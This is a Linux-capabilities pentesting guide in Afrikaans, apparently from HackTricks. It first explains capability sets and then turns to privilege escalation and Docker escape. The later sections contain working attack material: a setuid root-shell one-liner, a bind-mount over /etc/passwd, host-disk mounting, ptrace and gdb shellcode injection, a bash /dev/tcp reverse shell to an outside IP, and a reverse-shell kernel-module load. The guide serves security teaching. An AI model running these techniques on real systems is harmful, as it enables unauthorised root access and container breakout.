# Linux-vermoëns

{{#include ../../banners/hacktricks-training.md}}

Linux-vermoëns verdeel **root-voorregte in kleiner, afsonderlike eenhede**, sodat prosesse ’n deelversameling van voorregte kan hê. Dit verminder die risiko’s deur nie onnodig volledige root-voorregte toe te ken nie.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Die probleem:

- Normale gebruikers het beperkte toestemmings vir bewerkings soos die opening van rou sockets of die binding van Internet-poorte onder 1024; capabilities kan slegs die vereiste bewerking toestaan in plaas van volledige root-voorregte.<sup>[[14]](#references)</sup>

### Capability-stelle:

Linux stel hierdie capability-stelle per thread bloot, en die kernel pas hul beperkings toe wanneer ’n proses geloofsbriewe verander of ’n lêer uitvoer.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Doel**: Identifiseer capabilities wat tot die toegelate stel kan bydra ná `execve()` wanneer die uitgevoerde lêer ooreenstemmende inheritable file capabilities het.
- **Funksionaliteit**: Die thread se inheritable-stel word oor `execve()` heen behou; dit maak daardie capabilities nie op sigself effective nie.
- **Beperkings**: Die byvoeging van ’n capability tot hierdie stel word deur die permitted- en bounding-stelle beperk.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Doel**: Verteenwoordig die werklike capabilities wat ’n proses op enige gegewe oomblik gebruik.
- **Funksionaliteit**: Dit is die stel capabilities wat deur die kernel nagegaan word om toestemming vir verskeie bewerkings toe te staan. Vir lêers kan hierdie stel ’n vlag wees wat aandui of die lêer se permitted capabilities as effective beskou moet word.
- **Belangrikheid**: Die effective-stel is noodsaaklik vir onmiddellike voorregkontroles en tree op as die aktiewe stel capabilities wat ’n proses kan gebruik.

3. **Permitted (CapPrm)**:

- **Doel**: Definieer die maksimum stel capabilities wat ’n proses kan besit.
- **Funksionaliteit**: ’n Proses kan ’n capability van die permitted-stel na sy effective-stel verhoog, wat dit die vermoë gee om daardie capability te gebruik. Dit kan ook capabilities uit sy permitted-stel verwyder.
- **Grens**: As ’n capability uit hierdie stel verwyder word, kan dit normaalweg nie herstel word sonder om ’n lêer uit te voer wat dit toestaan, of sonder ’n ander bevoorregte oorgang nie.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Doel**: Beperk die capabilities wat ’n proses tydens `execve()` uit ’n lêer kan verkry, asook dié wat dit by sy inheritable-stel kan voeg.
- **Funksionaliteit**: Die stel word oor `fork()` heen geërf en oor `execve()` heen behou; capabilities kan daaruit verwyder word wanneer die caller `CAP_SETPCAP` het.
- **Gebruiksgeval**: Die verwydering van onnodige capabilities uit hierdie stel beperk latere voorregverkryging.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Doel**: Laat geselekteerde capabilities toe om oor `execve()` van ’n nonprivileged-program heen permitted en effective te bly.
- **Funksionaliteit**: Ambient capabilities word by die nuwe permitted- en effective-stelle gevoeg wanneer die uitgevoerde lêer nie privileged is nie.
- **Beperkings**: ’n Capability kan slegs ambient wees terwyl dit in beide die permitted- en inheritable-stelle teenwoordig is; die uitvoering van ’n set-user-ID/set-group-ID-lêer of ’n lêer met capabilities maak die ambient-stel leeg.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities van prosesse en binaries

### Capabilities van prosesse

Om die capabilities vir ’n spesifieke proses te sien, gebruik die **status**-lêer in die /proc-gids. Omdat dit meer besonderhede verskaf, beperk ons dit tot die inligting wat met Linux-capabilities verband hou.\
Let daarop dat capability-inligting vir alle lopende prosesse per thread bygehou word, terwyl file capabilities in `security.capability`-extended attributes gestoor word.<sup>[[14]](#references)[[15]](#references)</sup>

Jy kan die capabilities vind wat in /usr/include/linux/capability.h gedefinieer is.

Jy kan die capabilities van die huidige proses in `cat /proc/self/status` of met `capsh --print` vind, en dié van ander prosesse in `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Hierdie opdrag behoort op die meeste stelsels vyf capability-lyne te gee.<sup>[[15]](#references)</sup>

- CapInh = Geërfde capabilities
- CapPrm = Toegelate capabilities
- CapEff = Effektiewe capabilities
- CapBnd = Begrensingsversameling
- CapAmb = Ambient capabilities-versameling
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Hierdie heksadesimale getalle maak nie sin nie. Deur die `capsh`-nutsprogram te gebruik, kan ons hulle na capability-name dekodeer.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Kom ons kyk nou na die **capabilities** wat deur `ping` gebruik word:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Hoewel dit werk, is daar nog ’n ander en makliker manier. Om die capabilities van ’n lopende proses te sien, gebruik die **getpcaps**-tool gevolg deur sy proses-ID (PID); dit aanvaar ook ’n lys proses-ID’s.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Kom ons kyk na die capabilities van `tcpdump` nadat die binary `cap_net_admin` en `cap_net_raw` gegee is om die netwerk te sniff (`tcpdump` loop in proses 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Soos jy kan sien, stem die capabilities ooreen met die resultate van die twee maniere om ’n proses te inspekteer. Die `getpcaps`-tool gebruik libcap om ’n teikenproses se capabilities te navraag en dit in teksformaat te vertoon; dit aanvaar een of meer PIDs.<sup>[[22]](#references)</sup>

### Binêre lêers se Capabilities

Binêre lêers kan file capabilities hê wat tydens uitvoering toegepas word. Byvoorbeeld, ’n `ping`-binary kan die `cap_net_raw`-capability bevat.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Jy kan na binaries met capabilities soek deur `getcap -r` te gebruik.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

As ons `CAP_NET_RAW` uit die huidige bounding set verwyder, behoort ’n program wat daardie capability benodig, dit nie meer te kan gebruik nie.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Benewens die uitvoer van _capsh_ self, behoort die _tcpdump_-opdrag self ook ’n fout te veroorsaak.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Die fout wys dat `tcpdump` nie met die aangevraagde lêer-capability kan uitvoer nadat `CAP_NET_RAW` uit die bounding set verwyder is nie.

### Verwyder Capabilities

Jy kan ’n lêer se capabilities met `setcap -r` verwyder.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## Gebruikersvermoëns

Linux ken nie lêervermoëns direk aan ’n aanmeldgebruiker toe nie, maar die `pam_cap` PAM-module kan oorerfbare vermoëns vir geverifieerde sessies instel met behulp van `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Elke inskrywing koppel komma-geskeide vermoënname of -nommers aan een of meer gebruikersname.<sup>[[17]](#references)</sup>
Lêervoorbeeld:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Omgewingsvermoëns

Deur die volgende program te compileer, word dit moontlik om **'n bash shell binne 'n omgewing wat capabilities verskaf, te spawn**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Binne die **bash wat deur die saamgestelde ambient binary uitgevoer word**, is dit moontlik om die **nuwe capabilities** waar te neem (’n gewone gebruiker sal geen capability in die "current"-afdeling hê nie).<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Jy kan **slegs capabilities byvoeg wat in beide die permitted- en inheritable-stelle teenwoordig is**.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binaries

'n Capability-dumb binary is 'n program met file capabilities wat nie libcap gebruik om dit te bestuur nie. As sy file effective bit gestel is, aktiveer die kernel die file se permitted capabilities in die proses se effective set; uitvoering kan misluk as die proses nie al die permitted capabilities verkry het nie.<sup>[[14]](#references)</sup>

## Service Capabilities

'n Stelseldiens wat as root loop, kan breë capabilities behou tensy sy uitvoeringsomgewing dit beperk. In 'n systemd unit kies `User=` die diensgebruiker, en `AmbientCapabilities=` voeg benoemde capabilities by die ambient set vir die uitgevoerde proses.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker Containers

Docker begin containers met 'n verstekstel capabilities wat met `--cap-add` en `--cap-drop` verander kan word; 'n voorbeeldcontainer kan met `amicontained` geïnspekteer word.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities is nuttig wanneer jy **jou eie prosesse wil beperk nadat jy bevoorregte bewerkings uitgevoer het** (bv. nadat jy chroot opgestel en aan ’n socket gebind het). Hulle kan egter misbruik word deur kwaadwillige commands of arguments aan hulle deur te gee, wat dan as root uitgevoer word.<sup>[[2]](#references)</sup>

Jy kan file capabilities op programme afdwing met `setcap`, en hulle met `getcap` navraag doen.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Vir file-capability-teks verhoog `+ep` die benoemde capability in die effective- en permitted-stelle; `-` verlaag die geselekteerde flags.<sup>[[21]](#references)</sup>

Om programme in ’n stelsel of vouer met capabilities te identifiseer, gebruik `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

In die volgende voorbeeld word gevind dat die binary `/usr/bin/python2.6` kwesbaar is vir privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** wat `tcpdump` benodig om **enige gebruiker toe te laat om pakkette te sniff**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Die spesiale geval van "leë" capabilities

'n File kan 'n leë capability-stel bevat (`getcap myelf` gee `myelf =ep` terug). 'n Leë stel verleen geen capabilities nie; wanneer dit met 'n root-owned set-user-ID-bit gekombineer word, kan die program steeds die uitvoerende proses se effektiewe en gestoorde IDs na 0 verander sonder om file capabilities te verkry. 'n Unowned, nie-SUID/SGID-file met `=ep` loop nie as root nie.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is 'n uiters kragtige Linux capability, wat dikwels as byna-root-vlak beskou word weens sy uitgebreide **administratiewe voorregte**, soos om devices te mount of kernel-features te manipuleer. Hoewel dit onontbeerlik is vir containers wat volledige stelsels simuleer, **hou `CAP_SYS_ADMIN` beduidende sekuriteitsuitdagings in**, veral in containerized environments, weens die potensiaal daarvan vir privilege escalation en system compromise. Die gebruik daarvan vereis dus streng sekuriteitsassessering en versigtige bestuur, met 'n sterk voorkeur daarvoor om hierdie capability in application-specific containers te drop om aan die **principle of least privilege** te voldoen en die attack surface te minimaliseer.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Met Python kan jy ’n gewysigde _passwd_-lêer bo-op die werklike _passwd_-lêer mount:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
En laastens **mount** die aangepaste `passwd`-lêer op `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
En jy sal **`su` as root** kan gebruik met die wagwoord "password".

**Voorbeeld met omgewing (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-container nagaan met:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitvoer kan jy sien dat die SYS_ADMIN-capability geaktiveer is.<sup>[[14]](#references)</sup>

- **Mount**

Met geskikte device- en namespace-toegang kan dit 'n Docker-container toelaat om 'n host-skyf te **mount en toegang tot die inhoud daarvan te verkry**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Volledige toegang**

In die vorige metode het ons daarin geslaag om toegang tot 'n gasheerskyf te verkry.\
As die gasheer 'n **ssh**-bediener gebruik, kan jy **'n gebruiker op die gemonteerde skyf skep** en toegang daartoe via SSH verkry.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Met `CAP_SYS_PTRACE` kan 'n proses ander prosesse naspoor en inspekteer wat in sy PID namespace sigbaar is. Om host-prosesse vanuit 'n Docker-container te teiken, deel die host PID namespace met `--pid=host` (of sluit aan by 'n namespace wat die teiken bevat).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** verleen die vermoë om debugging- en system call tracing-functionaliteit te gebruik wat deur `ptrace(2)` en cross-memory attach calls soos `process_vm_readv(2)` en `process_vm_writev(2)` verskaf word. Hoewel dit kragtig is vir diagnostiese en moniteringsdoeleindes, kan dit, indien `CAP_SYS_PTRACE` geaktiveer is sonder beperkende maatreëls soos 'n seccomp-filter op `ptrace(2)`, stelselsekuriteit aansienlik ondermyn. Dit kan spesifiek uitgebuit word om ander sekuriteitsbeperkings te omseil, veral dié wat deur seccomp opgelê word, soos gedemonstreer deur [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Voorbeeld met binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Voorbeeld met binary (gdb)**

`gdb` met `ptrace`-vermoë:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Skep shellcode met msfvenom om dit via gdb in memory te inject.
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debug 'n root-proses met gdb en kopieer-plak die voorheen gegenereerde gdb-reëls:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Voorbeeld met omgewing (Docker breakout) - Nog ’n gdb Abuse**

As **GDB** geïnstalleer is (of jy dit byvoorbeeld met `apk add gdb` of `apt install gdb` kan installeer), kan jy **debug a process from the host** en dit die `system`-funksie laat aanroep. (Hierdie tegniek vereis ook die capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Jy sal nie die uitvoer van die uitgevoerde command kan sien nie, maar dit sal deur daardie process uitgevoer word (kry dus ’n rev shell).

> [!WARNING]
> If you get the error "No symbol "system" in current context." check the previous example loading a shellcode in a program via gdb.

**Voorbeeld met environment (Docker breakout) - Shellcode Injection**

Jy kan die enabled capabilities binne die Docker-container nagaan deur:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lys **processes** wat in die **host** loop: `ps -eaf`

1. Kry die **argitektuur**: `uname -m`
2. Vind ’n **shellcode** vir die argitektuur ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Vind ’n **program** om die **shellcode** in ’n process se geheue te **inject** ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Verander** die **shellcode** binne die program en **compile** dit: `gcc inject.c -o inject`
5. **Inject** dit en kry jou **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** stel ’n process in staat om kernel modules te **load** en **unload** (`init_module(2)`, `finit_module(2)` en `delete_module(2)` system calls), wat direkte toegang tot die kernel se kernbewerkings bied. Hierdie capability hou kritieke sekuriteitsrisiko’s in, omdat die loading van ’n module kernelgedrag kan verander en isolasiegrense kan omseil.<sup>[[6]](#references)[[14]](#references)</sup>
**Dit laat toe dat modules in die kernel wat vir die process sigbaar is, ingevoeg of verwyder word; in ’n container hang dit van die isolasiekonfigurasie af of dit die host se kernel is**.<sup>[[14]](#references)</sup>

**Voorbeeld met binary**

In die volgende voorbeeld het die binary **`python`** hierdie capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
By verstek, **`modprobe`**-opdrag kyk vir afhanklikheidslys- en kaartlêers in die gids **`/lib/modules/$(uname -r)`**.\
Om dit te misbruik, kom ons skep ’n vals **lib/modules**-gids:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Kompileer dan **die kernel module wat jy hieronder in 2 voorbeelde kan vind en copy** dit na hierdie vouer:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Laastens, voer die nodige Python-kode uit om hierdie kernel module te laai:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Voorbeeld 2 met binary**

In die volgende voorbeeld het die binary **`kmod`** hierdie capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
